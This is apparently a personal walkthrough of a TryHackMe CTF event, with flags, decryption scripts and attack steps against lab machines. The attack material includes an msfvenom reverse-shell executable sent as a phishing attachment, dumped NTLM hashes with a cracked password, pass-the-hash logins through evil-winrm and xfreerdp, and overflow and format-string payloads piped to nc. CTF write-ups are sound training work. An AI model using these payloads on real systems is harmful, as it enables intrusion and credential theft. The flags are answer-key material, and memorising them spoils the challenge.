# Hackfinity Battle

## Task 6 (√)

THM{Coringa_do_Beco}

## Task 8

```
THM{520_highway_76_ste_14}  520 TN-76, White House, TN 37188美国
```

## Task 9 (√)

THM{i_can_see_your_notes}

访问 note_id=0

## Task 12 (√)

THM{the_hackfinity_highschool}

ORDER: Attack at dawn. Target: THM{the_hackfinity_highschool}.

```python
import binascii

ciphertext = binascii.unhexlify("1c1c01041963730f31352a3a386e24356b3d32392b6f6b0d323c22243f63731a0d0c302d3b2b1a292a3a38282c2f222d2a112d282c31202d2d2e24352e60")
key = b"SNEAKY"

plaintext = bytes([ciphertext[i] ^ key[i % len(key)] for i in range(len(ciphertext))])
print(plaintext.decode())
```

## Task 14

这次要生成 docm 带有宏的反弹木马:

```

```

## Task15

```
* Username : ByteReaper
* Domain   : DUMP
* NTLM     : 43034346035d7a24b1eaa1c82acaef3e
* SHA1     : f3b540c9d2f6d4167d4547231518ea1e177f1ef3
* DPAPI    : f3b540c9d2f6d4167d4547231518ea1e

* Username : NullPhantom
* Domain   : DUMP
* NTLM     : 75b216fc8d12fbd0124d0c0865118e4d
* SHA1     : 5fd4a13af67509c2767224bb1af6644f3f7ed6d4
* DPAPI    : 5fd4a13af67509c2767224bb1af6644f

* Username : specter
* Domain   : DUMP
* NTLM     : 2c3e48bac1b65c52fc0fb0cd70eaf3aa
* SHA1     : 18daa8d22e0c63318e349c84f02ccde9f4703faa
* DPAPI    : 18daa8d22e0c63318e349c84f02ccde9

* Username : Administrator
* Domain   : DUMP
* NTLM     : 2dfe3378335d43f9764e581b856a662a
* SHA1     : 6529ad96db96f0332eb6ab3d912923d55f34b947
* DPAPI    : 6529ad96db96f0332eb6ab3d912923d5

* Username : ShadowPacket
* Domain   : DUMP
* NTLM     : 5fe2eb8c75c48179bce6025e70859e47
* SHA1     : a9251b4d13ca76d70a6f32c503b85a4a29bb5ab5
* DPAPI    : a9251b4d13ca76d70a6f32c503b85a4a

* Username : GhostTrace
* Domain   : DUMP
* NTLM     : 4820e4687d0ed2845328aa492dc0b33c
* SHA1     : 4bb51376ce7cc228e124dad2eeb9b8d62db1844f
* DPAPI    : 4bb51376ce7cc228e124dad2eeb9b8d6

* Username : DarkInjector
* Domain   : DUMP
* NTLM     : 3a659a65d9c16d40a28684995782458f
* SHA1     : 76896bc65bdf920328a5fba3bcc67fb8c42b6252
* DPAPI    : 76896bc65bdf920328a5fba3bcc67fb8

* Username : Cipher
* Domain   : DUMP
* NTLM     : 6786c31df90f9568d4ca2480affeea9a
* SHA1     : a326d034836aa5ae571910a8ffe0d8b94a1a9f21
* DPAPI    : a326d034836aa5ae571910a8ffe0d8b9
```

哈希传递 evil-winrm:

```
evil-winrm -u NullPhantom -H 75b216fc8d12fbd0124d0c0865118e4d -i 10.10.237.41
```

这个哈希能破解 75b216fc8d12fbd0124d0c0865118e4d -> NuNu25!

xfreerdp /v:10.10.248.251 /u:NullPhantom /pth:75b216fc8d12fbd0124d0c0865118e4d

## Task 16 (√)

THM{3m41l_ph1sh1ng_1s_3z}

生成 exe，用邮件附件上传回复:

```
msfvenom -p windows/x64/reverse_tcp lhost=10.10.139.80 lport=8888 -f exe -o SilentEdge.exe
```

kali 上得到反弹的 shell，读取 flag.txt：

```
c:\Users\Administrator\Desktop>type c:\users\administrator\desktop\flag.txt
type c:\users\administrator\desktop\flag.txt
THM{3m41l_ph1sh1ng_1s_3z}
```

## Task 24 (√)

THM{n0t_s3cur3_f1l3_sh4r1ng}

Follow Tcp 发现 Archive Password 90eb7723a657b6597100aafef171d9f2 (md5) 爆破后是密码: avengers

找到 hidden_stash.zip 文件那个数据包(第 286 个数据包，导出 Data 字段的值)，找到 504b0304 开头的 zip 文件流进行保存：

```
504b0304140009000800d402675a845a68e16a020000660300000b001c00736563726574732e706e675554090003d0cbc967f9cbc96775780b000104f50100000414000000c01c27f8cfe35dd73be6a8aeb8ea2d920dbeab8d5e0b55d090da1ade3897419e92588225c379cf5ee288bb32321b0222a8efabbb8832f701466452b81798deb8298154809eedd4301aa88022318156cc6889148bd104e06fd81ea290d02e11d3d0c7e2318e0172524edeb7cc98f407993f66b5463bcc95e6618b12333dc5de558d4d59ea31f2c1445ed4c939630dfe3c6d241d4cf4f5b1f30e646875d8591aa9c5cfbb2cf0a4d7b6638a0946e39b0a1da2a4869a210b5d46fce1ddae4415d6327d2e9776185bf827d2d01efda78349677e69e0bde769eefeb2a9c83c680b8ad75d061d5fe50690a6a77ff3dc17a5e97d686d8157f36559a84525341e25d992ec57003d587c496ecead50e14d48098c899ccbff3721698f5d2214cb4b104da5728e370767f0568d34a0bb3841052932cd3b7332ea59cb7d431bba2f75a33cc3ae69b7809200b06a6b2159a4c71db4dfe9bec9fbf52442b68b8e1d8b97800d058d7a121445ff5a142fd85c22e89dde607189c1dc24d742fd781c65abd7941af4b1e89bf623d70c970df7a446b562256ea37a7cca3538fcc4114da7f2f82818f6cc7826a076843134d089272dc66051c0fc4e95e5041299d805c5e0853db6898e04bfd4e2c064a7f667f9ebbc21b746d45edd830f9e40cfa72d0dd017f03f41f2cc3910f36cd6a3908a3700f199e70ec47104aacdfae61f378b003813f37d0f0324898f36a4865a6fcd6e6a08b0681cc141be2123f9912d50d80272e624358ec842d9d12883b7d4b9a842e08da63aa9fd595026f536d76105f5e0fd89cfce058f2720e4afe5a01b1710423c3b8246d5b58e42dcf6fff41673c231644c45136076df534663ae69e028f2e7ba504b0708845a68e16a02000066030000504b01021e03140009000800d402675a845a68e16a020000660300000b0018000000000000000000a48100000000736563726574732e706e675554050003d0cbc96775780b000104f50100000414000000504b0506000000000100010051000000bf02000000000000
```

使用 cyberchef fromhex 转换后保存到 zip 中，用这个密码 avengers 解压，得到一个二维码文件 secrets.png 识别二维码得到 flag。

## Task 25 (√)

THM{sup3r_34sy_w3bsh3ll}

flag 是编码在请求的参数中:

```
root@tryhackme:/var/log/apache2# grep '?query=' other_vhosts_access.log.1
root@tryhackme:/var/log/apache2# echo 'ZWNobyAnVEhNe3N1cDNyXzM0c3lfdzNic2gzbGx9Jwo='|base64 -d
echo 'THM{sup3r_34sy_w3bsh3ll}'
```

## Task 27

## Task 28

## Task 29

## Task 30 (√)

THM{a_sm4ll_crypt0_message_to_st4rt_with_THM_cracks}

```python
encrypted = "a_up4qr_kaiaf0_bujktaz_qm_su4ux_cpbq_ETZ_rhrudm"
decrypted = []

for i, c in enumerate(encrypted):
    if c.isalpha():
        base = ord('A') if c.isupper() else ord('a')
        original_code = (ord(c) - base - i) % 26 + base
        decrypted.append(chr(original_code))
    else:
        decrypted.append(c)

decrypted_str = ''.join(decrypted)
print(f"THM{{{decrypted_str}}}")
```

## Task 31 (√)

THM{THM{Just_s0m3_small_amount_of_RSA!}}

```python
import gmpy2
from Crypto.Util.number import inverse, long_to_bytes

n = 15956250162063169819282947443743274370048643274416742655348817823973383829364700573954709256391245826513107784713930378963551647706777479778285473302665664446406061485616884195924631582130633137574953293367927991283669562895956699807156958071540818023122362163066253240925121801013767660074748021238790391454429710804497432783852601549399523002968004989537717283440868312648042676103745061431799927120153523260328285953425136675794192604406865878795209326998767174918642599709728617452705492122243853548109914399185369813289827342294084203933615645390728890698153490318636544474714700796569746488209438597446475170891
c = 3591116664311986976882299385598135447435246460706500887241769555088416359682787844532414943573794993699976035504884662834956846849863199643104254423886040489307177240200877443325036469020737734735252009890203860703565467027494906178455257487560902599823364571072627673274663460167258994444999732164163413069705603918912918029341906731249618390560631294516460072060282096338188363218018310558256333502075481132593474784272529318141983016684762611853350058135420177436511646593703541994904632405891675848987355444490338162636360806437862679321612136147437578799696630631933277767263530526354532898655937702383789647510
e = 0x10001

# 计算n的平方根并寻找附近的素数p和q
sqrt_n = gmpy2.isqrt(n)
p = None
q = None

# 向下搜索p
current = sqrt_n
while current > 0:
    if current % 2 == 0:
        current -= 1  # 确保为奇数
    if gmpy2.is_prime(current):
        q_candidate = gmpy2.next_prime(current)
        if current * q_candidate == n:
            p = current
            q = q_candidate
            break
    current -= 2  # 每次递减2（仅检查奇数）

# 如果未找到，尝试向上搜索
if p is None:
    current = sqrt_n + 1
    while True:
        if current % 2 == 0:
            current += 1
        if gmpy2.is_prime(current):
            q_candidate = gmpy2.next_prime(current)
            if current * q_candidate == n:
                p = current
                q = q_candidate
                break
        current += 2

# 计算私钥并解密
phi = (p - 1) * (q - 1)
d = inverse(e, phi)
m = pow(c, d, n)
flag = long_to_bytes(m).decode()

print(f"THM{{{flag}}}")
```

## Task 32

```python
username = b"bytereaper\x00"
padding_len = 100 - len(username)
padding = padding_len * b'A'
password = b"5up3rP4zz123Byte\x00"
payload = username + padding + password
print(payload)
print(payload.decode())
```

```
python -c 'print("bytereaper\x00" + "A"*90 + "5up3rP4zz123Byte\x00")' | nc 10.10.132.24 1337
```

## Task 33 (√)

THM{format_issues}

```
echo '%5$s' | nc 10.10.201.230 1337
```

## Task 34

```
aws configure
```

## Task 35 (√)

THM{this_is_not_what_i_meant_by_public}

```
aws s3 ls "s3://darkinjector-phish"
aws s3 cp "s3://darkinjector-phish/captured-logins-093582390" .

user,pass
munra@thm.thm,Password123
test@thm.thm,123456
mario@thm.thm,Mario123
flag@thm.thm,THM{this_is_not_what_i_meant_by_public}
```

## Task 36

```
aws s3 ls "s3://secret-messages"
aws s3 cp "s3://secret-messages/20250301.msg.enc" .

{
    "CiphertextBlob": "AQICAHiRefyqdd9pxM2Aq1I0DJhHPH2ySQ1xLKMiWr9h8LHTjwHUJLxfxuK9KK+SPLYApHM2AAADsTCCA60GCSqGSIb3DQEHBqCCA54wggOaAgEAMIIDkwYJKoZIhvcNAQcBMB4GCWCGSAFlAwQBLjARBAytaKub7KcmaE79aAgCARCAggNkvNoABrJ009jrn+j065jaUP7ABSahYUWVCtYVKoTAmlfh01L7szyf6pEn/yz09iq2LLcu9ndGT6DHEL/Ctzw7MB/5QFr0eWUYGxASZm79JvCH1bSwQR7XeNHQDHjdGg1X6LJO8GwyihEfGzs7XOdtFysWXHTEK3nBphQy0GDmPNMUg27Jhayk4jSL4c3ezk0GX21YelNWNExJmOQMPkPjErlPt/0oK7DGmLd3qwcc/X6iIxeW4CsAx4zIP3hQVOSFrUfZNuGNr/4JSH3ZhgxJRbB0DUk3ibaM4uQxGs2wi1N1zG1fjd86d7a9Rk29Zk+7m8EOtboDGf6rSVNXh/VMjeKFFmsIzQiiA2Z8FixDW530qgFFiUmOuuTJaVbS70ktXXYJcOsW6cfl2n45BxMcgDGuSGQSORHddijJY3o/7Si0MadR7dM3SNkxTT6HoRu0/5Rr2vVd8VBEU6bLCacWoWhLA18poYO9oI+Q1SaPmK+1zPL51ZBYvEcZ2jQov1olEcm/lpym1+HpAOdO9RLvTDjhnpT7/4+AVbkB2yhIdZvRk3x0GNMCtyNw76PpN4UH+CegZ7QTvXO7B5iLKWmb8Zdx9sRI4e0QzmpxPlCEiGCXotsQ+jW/sDcrrbwbEw+3XKtuge2+NRUhIWoG7++yWELf+SPheMEJ4RH+Ikz6rl0Z4J/BtN9eefiP62gEV2eY+RkJXh3Ox41S/P0yiiNh/t62Gq8SPgvEeCF6lwRA3gGchjI86mJdmUdhG1mFf+8/FDRCJ7mi1AoEOXVUJyNh9+MaOPp7fhwxYG/ZQZ2Mx51UX3nYCbU2aa4FUWMEM6I83ZEnxKV4qVyTTRV5PkZx3B7r1heJVsV9zi01OZBPPY1yyW6Xr+Pvmegv6k8PYFO88TcFDiaAlA1ZtTRPFfZ8fEiNysx6t1WAKSTim7SmyHDNoPJvFSUZhosoEArNY3pxgra2LzM8LwNTE+X6c0oqp4Ts4cQOOy+95AlpT8OcVWQV2VhZGObDYImQIc/IXogOWS6xlcSwln5XcB+R/JjsEBxxiZcaASa2P1JY03SQRBz9NpLqMa92PgDDy97lf9xd1M18svoSjsugDURIr7NoEwIJyAAQonrkLjyRZ84WPRBfohDIgKOqMEG4eW+aOoLpLeWTXA==",
    "KeyId": "arn:aws:kms:us-west-2:332173347248:key/b7a11be8-2a95-429e-978c-36a18a0d3e81",
    "EncryptionAlgorithm": "SYMMETRIC_DEFAULT"
}

将CiphertextBlob值复制出来base64解码，放到 download.dat 中

echo "AQICAHiRefyqdd9pxM2Aq1I0DJhHPH2ySQ1xLKMiWr9h8LHTjwHUJLxfxuK9KK+SPLYApHM2AAADsTCCA60GCSqGSIb3DQEHBqCCA54wggOaAgEAMIIDkwYJKoZIhvcNAQcBMB4GCWCGSAFlAwQBLjARBAytaKub7KcmaE79aAgCARCAggNkvNoABrJ009jrn+j065jaUP7ABSahYUWVCtYVKoTAmlfh01L7szyf6pEn/yz09iq2LLcu9ndGT6DHEL/Ctzw7MB/5QFr0eWUYGxASZm79JvCH1bSwQR7XeNHQDHjdGg1X6LJO8GwyihEfGzs7XOdtFysWXHTEK3nBphQy0GDmPNMUg27Jhayk4jSL4c3ezk0GX21YelNWNExJmOQMPkPjErlPt/0oK7DGmLd3qwcc/X6iIxeW4CsAx4zIP3hQVOSFrUfZNuGNr/4JSH3ZhgxJRbB0DUk3ibaM4uQxGs2wi1N1zG1fjd86d7a9Rk29Zk+7m8EOtboDGf6rSVNXh/VMjeKFFmsIzQiiA2Z8FixDW530qgFFiUmOuuTJaVbS70ktXXYJcOsW6cfl2n45BxMcgDGuSGQSORHddijJY3o/7Si0MadR7dM3SNkxTT6HoRu0/5Rr2vVd8VBEU6bLCacWoWhLA18poYO9oI+Q1SaPmK+1zPL51ZBYvEcZ2jQov1olEcm/lpym1+HpAOdO9RLvTDjhnpT7/4+AVbkB2yhIdZvRk3x0GNMCtyNw76PpN4UH+CegZ7QTvXO7B5iLKWmb8Zdx9sRI4e0QzmpxPlCEiGCXotsQ+jW/sDcrrbwbEw+3XKtuge2+NRUhIWoG7++yWELf+SPheMEJ4RH+Ikz6rl0Z4J/BtN9eefiP62gEV2eY+RkJXh3Ox41S/P0yiiNh/t62Gq8SPgvEeCF6lwRA3gGchjI86mJdmUdhG1mFf+8/FDRCJ7mi1AoEOXVUJyNh9+MaOPp7fhwxYG/ZQZ2Mx51UX3nYCbU2aa4FUWMEM6I83ZEnxKV4qVyTTRV5PkZx3B7r1heJVsV9zi01OZBPPY1yyW6Xr+Pvmegv6k8PYFO88TcFDiaAlA1ZtTRPFfZ8fEiNysx6t1WAKSTim7SmyHDNoPJvFSUZhosoEArNY3pxgra2LzM8LwNTE+X6c0oqp4Ts4cQOOy+95AlpT8OcVWQV2VhZGObDYImQIc/IXogOWS6xlcSwln5XcB+R/JjsEBxxiZcaASa2P1JY03SQRBz9NpLqMa92PgDDy97lf9xd1M18svoSjsugDURIr7NoEwIJyAAQonrkLjyRZ84WPRBfohDIgKOqMEG4eW+aOoLpLeWTXA==" | base64 -d > download.dat

aws kms decrypt --ciphertext-blob fileb:///tmp/encrypted-file --query Plaintext --output text

aws kms encrypt --key-id b7a11be8-2a95-429e-978c-36a18a0d3e81 --plaintext "abcd" --query CiphertextBlob --output text

aws kms decrypt --ciphertext-blob fileb://download.dat --query Plaintext --output text | base64 -d
```

解密有问题，提示无权限。

## Task 42

```
root@ip-10-10-139-80:~/Desktop# aws s3 ls
2024-05-02 05:39:42 redteamapp-bucket
```

访问 http://redteamapp-bucket.s3-website-us-east-1.amazonaws.com/ 出现列表，有 3 个公司的泄露信息，让分别联系那 3 个人。

联系第一个: https://www.threads.net/@v3n0mbyt3_/post/C6Bgdo9PeFR 底部值进行 base64 解码 得到 THM{sl1th3ry_tw33tz_4nd_l34ky_r3pl13s!}
